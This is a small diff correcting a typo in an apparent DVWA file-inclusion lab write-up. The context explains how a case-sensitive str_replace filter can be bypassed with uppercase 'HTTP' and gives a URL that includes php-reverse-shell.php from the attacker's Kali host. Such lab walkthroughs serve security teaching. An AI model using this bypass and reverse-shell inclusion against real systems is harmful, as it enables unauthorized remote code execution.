@@ -24,7 +24,7 @@ When reading documentation on <code><a href="https://www.w3schools.com/php/func_
 
 <blockquote>Note: This function is case-sensitive. Use the str_ireplace() function to perform a case-insensitive search.</blockquote>
 
-That means that anything that does not match <code>http&#58;//</code>, <code>https&#58;//</code>, <code>../</code> or <code>..\\</code> EXACTLy will still work. So let's modify our easy mode exploit by converting <code>http</code> to <code>HTTP</code> and try to replicate the exploit:
+That means that anything that does not match <code>http&#58;//</code>, <code>https&#58;//</code>, <code>../</code> or <code>..\\</code> EXACTLY will still work. So let's modify our easy mode exploit by converting <code>http</code> to <code>HTTP</code> and try to replicate the exploit:
 
 <b>http&#58;//dvwa/dvwa/vulnerabilities/fi/?page=HTTP&#58;//</b>[your_Kali_IP]<b>:9999/php-reverse-shell.php</b>
 
